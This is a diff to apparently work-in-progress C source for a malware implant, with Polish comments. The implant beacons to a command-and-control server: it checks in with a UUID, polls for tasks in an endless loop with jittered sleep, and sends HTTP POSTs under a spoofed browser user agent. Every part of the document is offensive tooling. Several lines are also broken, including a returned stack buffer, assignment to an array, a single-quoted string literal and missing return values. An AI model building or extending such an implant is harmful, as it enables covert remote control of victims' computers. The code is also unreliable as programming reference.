@@ -23,6 +23,8 @@ typedef struct {
     char killdate[32];  //
 } implant_config;
 
+char json_buff[250];
+
 //implant_config config = {
 //    .host = "REPLACE_ME_HOST",
 //    .port = REPLACE_ME_PORT,     
@@ -57,7 +59,7 @@ implant_config config = {
     .killdate = "REPLACE_ME_KILLDATE" //
 };
 
-void send_c2_post_request(char* json_data) {
+char* send_c2_post_request(char* json_data) {
     HINTERNET hInternet = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) return;
 
@@ -76,7 +78,9 @@ void send_c2_post_request(char* json_data) {
         DWORD bytesRead;
         if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
             buffer[bytesRead] = '\0';
-            printf("Odpowiedź serwera: %s\n", buffer);
+            //printf("Odpowiedź serwera: %s\n", buffer);
+            //snprintf(json_data,sizeof(buffer),buffer)
+            return buffer;
         }
     }
 
@@ -85,13 +89,19 @@ void send_c2_post_request(char* json_data) {
     InternetCloseHandle(hInternet);
 }
 bool checkin(){
-        char json_buff[150];
+        char json_checkin_buff[150];
     snprintf(json_buff,sizeof(json_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"NOT IMPLEMENTED\", \"user\": \"NOT IMPLEMENTED\", \"host\": \"NOT IMPLEMENTED\", \"pid\": 0, \"architecture\": \"x64\"}",config.uuid);
-    send_c2_post_request(json_buff); //checkin do serwera
+    json_buff = send_c2_post_request(json_buff); //checkin do serwera
+    cJSON *root = cJSON_Parse(json_buff);
+    if (*root){
+        cJSON *status = cJSON_GetObjectItemCaseSensitive(root, "status");
+        cJSON *id = cJSON_GetObjectItemCaseSensitive(root, "id");
+        cJSON *session_id = cJSON_GetObjectItemCaseSensitive(root, "session_id");
+    }
 }
 	
 void get_tasks(){
-
+send_c2_post_request('{"action": "get_tasking", "tasking_size": -1}');
 return;
 }
 
@@ -99,16 +109,18 @@ bool sleep_with_jitter(int interval, int jitter){
     int variation = (interval * jitter)/100;
     int sleep = (interval - variation) + rand()%(2*variation+1);
         Sleep(sleep * 1000);
-
 return 0;
 }
+
+
+
 int main(){
-	char json_buff[512];
 	checkin();
 //main loop
     for(;;){
         get_tasks();
         sleep_with_jitter(config.interval,config.jitter);
+
     }
 
 	return 0;
